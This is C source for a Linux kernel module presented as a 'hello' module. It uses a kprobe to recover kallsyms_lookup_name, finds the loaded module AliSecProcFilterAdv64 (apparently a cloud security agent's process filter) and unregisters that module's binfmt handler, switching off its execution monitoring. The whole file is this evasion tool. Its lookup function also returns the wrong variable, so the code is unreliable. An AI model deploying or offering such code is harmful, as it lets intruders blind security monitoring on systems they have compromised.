```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/types.h>
#include <linux/rwlock_types.h>
#include <linux/binfmts.h>

rwlock_t *p_binfmt_lock = NULL;
struct linux_binfmt *ali_binfmt;
struct list_head *p_formats = NULL;
struct module *p_ali_sec_proc_filter_module = NULL;


/// kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;
static void init_ksymbol(void){
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
}


static struct linux_binfmt *find_ali_binfmt(void)
{
    struct linux_binfmt *fmt;
    struct linux_binfmt *ret_fmt = NULL;

    read_lock(p_binfmt_lock);
    
    list_for_each_entry(fmt, p_formats, lh) {
        if(fmt->module == p_ali_sec_proc_filter_module){
            ret_fmt = fmt;
            break;
        }
    }

    read_unlock(p_binfmt_lock);

    return fmt;
}

static int __init hello_init(void)
{
    struct module *p_module = NULL;
    printk("my hello module init\n");
    
    init_ksymbol();
    
    list_for_each_entry(p_module,&(__this_module.list),list){
        if(strcmp("AliSecProcFilterAdv64",p_module->name) == 0) {
            p_ali_sec_proc_filter_module = p_module;
        }
    }

    if(p_ali_sec_proc_filter_module == NULL){
        printk("find AliSecProcFilterAdv64 module error\n");
        return -1;
    }else{
        printk("find AliSecProcFilterAdv64 module ok\n");
    }

    p_formats = (struct list_head *)my_kallsyms_lookup_name("formats");
    if(p_formats == NULL){
        printk("get formats addr error\n");
        return -1;
    }

    p_binfmt_lock = (rwlock_t *)my_kallsyms_lookup_name("binfmt_lock");
    if(p_binfmt_lock == NULL){
        printk("get binfmt_lock addr error\n");
        return -1;
    }

    ali_binfmt = find_ali_binfmt();
    if(ali_binfmt == NULL){
        printk("get ali binfmt error\n");
        return -1;
    }

    unregister_binfmt(ali_binfmt);

    return 0;
}

static void __exit hello_exit(void)
{
    printk("hello exit\n");

    register_binfmt(ali_binfmt);
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE("GPL");
```

